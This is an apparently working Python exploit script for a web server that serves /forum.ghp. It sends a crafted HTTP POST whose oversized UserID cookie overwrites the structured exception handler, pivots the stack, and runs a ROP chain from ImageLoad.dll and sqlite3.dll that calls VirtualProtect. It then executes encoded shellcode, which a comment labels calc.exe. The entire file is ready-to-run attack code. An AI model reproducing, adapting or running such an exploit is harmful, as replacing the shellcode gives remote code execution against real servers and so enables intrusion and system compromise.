import socket, struct

# Exploit author ihack4falafel
# SEH Trick -> ADD ESP, 1004 -> jump to ROP

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1", 80))

shellcode = (
"\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
"\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
"\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
"\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
"\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
"\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
"\x1c\x39\xbd" 
)

# ESI = ptr to VirtualProtect()
buffer = struct.pack('<L', 0x10015442)      # POP EAX # RETN [ImageLoad.dll]
buffer += struct.pack('<L', 0x61c832d0)      # ptr to &VirtualProtect() [IAT sqlite3.dll]
buffer += struct.pack('<L', 0x1002248c)      # MOV EAX,DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]
buffer += struct.pack('<L', 0x61c18d81)      # XCHG EAX,EDI # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x1001d626)      # XOR ESI,ESI # RETN [ImageLoad.dll]
buffer += struct.pack('<L', 0x10021a3e)      # ADD ESI,EDI # RETN 0x00 [ImageLoad.dll]

# EBP = ReturnTo (ptr to jmp esp)
buffer += struct.pack('<L', 0x1001add7)      # POP EBP # RETN [ImageLoad.dll]
buffer += struct.pack('<L', 0x61c24169)      # & push esp # ret  [sqlite3.dll]

# EDX = NewProtect (0x40)
buffer += struct.pack('<L', 0x10022c4c)       # XOR EDX,EDX # RETN [ImageLoad.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]
buffer += struct.pack('<L', 0x61c059a0)       # INC EDX # ADD AL,0C9 # RETN [sqlite3.dll]

# ECX = lpOldProtect (ptr to W address)
buffer += struct.pack('<L', 0x1001b377)      # POP ECX # RETN [ImageLoad.dll]
buffer += struct.pack('<L', 0x61c730ad)      # &Writable location [sqlite3.dll]

# EBX = dwSize (0x00000501)
buffer += struct.pack('<L', 0x10015442)	     # POP EAX # RETN [ImageLoad.dll]
buffer += struct.pack('<L', 0xfffffaff)      # will become 0x00000501 after negate
buffer += struct.pack('<L', 0x100231d1)	     # NEG EAX # RETN [ImageLoad.dll]
buffer += struct.pack('<L', 0x1001da09)      # ADD EBX,EAX # MOV EAX,DWORD PTR SS:[ESP+C] # INC DWORD PTR DS:[EAX] # RETN [ImageLoad.dll]
buffer += struct.pack('<L', 0x1001a858)      # RETN (ROP NOP) [ImageLoad.dll]
buffer += struct.pack('<L', 0x1001a858)      # RETN (ROP NOP) [ImageLoad.dll]
buffer += struct.pack('<L', 0x10015442)	     # POP EAX # RETN [ImageLoad.dll]
buffer += struct.pack('<L', 0x61c730ad)      # &Writable location [sqlite3.dll]

# EDI = ROP NOP (RETN)
buffer += struct.pack('<L', 0x10019f47)      # POP EDI # RETN [ImageLoad.dll]
buffer += struct.pack('<L', 0x1001a858)      # RETN (ROP NOP) [ImageLoad.dll]

# EAX = NOP (0x90909090)
buffer += struct.pack('<L', 0x10015442)      # POP EAX # RETN [ImageLoad.dll]
buffer += struct.pack('<L', 0x90909090)      # nop
buffer += struct.pack('<L', 0x100240c2)      # PUSHAD # RETN [ImageLoad.dll]

buffer += "\x90" * 50                        # nop
buffer += shellcode                          # calc.exe
buffer += "\x90" * 50                        # nop

magic =  "\x90" * (4060 - len(buffer) - 0x27c) # stack alignment
magic += buffer
magic += "\x90" * (0x27c - 1)          # padding 
magic += "\x90\x90\x90\x90"            # NOPS
magic += struct.pack('<L', 0x10022869) # SEH ADD ESP,1004 # RETN [ImageLoad.dll]
magic += "\x90" * (20000 - len(magic))

payload =  "POST /forum.ghp HTTP/1.1\r\n"
payload += "Host: 127.0.0.1:80\r\n"
payload += (
"Cookie:"
"SESSIONID=27953;"
"UserID=" + magic + ";"
"PassWD=;"
"frmUserName=;"
"frmUserPass=;"
"rememberPass=202%2C197%2C208%2C215%2C201\r\n")
payload += "Connection: keep-alive\r\n\r\n"

s.send(payload)
print "[+] Exploit sent!"
s.close()
